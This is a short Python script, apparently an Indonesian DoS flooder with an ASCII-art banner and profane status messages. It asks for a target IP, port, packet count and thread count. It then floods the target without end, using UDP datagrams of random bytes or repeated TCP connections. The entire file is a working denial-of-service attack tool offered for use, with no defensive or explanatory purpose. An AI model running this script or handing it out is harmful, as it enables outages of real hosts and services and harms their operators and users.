#!/usr/bin/env python3
#Autor : Leon
import random
import socket
import threading
import os
import sys

os.system("clear")
print("  Remake By : Ndag Og")
print("░░██╗██╗███████╗██╗░██████╗")
print("░██╔╝██║╚════██║██║██╔════╝")
print("██╔╝░██║░░███╔═╝██║╚█████╗░")
print("███████║██╔══╝░░██║░╚═══██╗")
print("╚════██║███████╗██║██████╔╝")
print("░░░░░╚═╝╚══════╝╚═╝╚═════╝░")
  
ip = str(input("  Ip Target:"))
port = int(input(" Port Target:"))
choice = str(input(" Gasken Gak(y/n):"))
times = int(input(" Paket :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1189)
	i = random.choice(("[4ZIS NIH BOSS]","[4ZIS NIH BOS]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SENGGOL DONG !!! ")
		except:
			print("[KONTOL] DOWN BWANG WKWK")

def run2():
	data = random._urandom(6)
	i = random.choice(("[4ZIS NIH BOS]","[4ZIS NIH BOS]","[4ZIS NIH BOS]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SENGGOL DONG !!! ")
		except:
			s.close()
			print("[KONTOL] DOWN BWANG WKWK")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
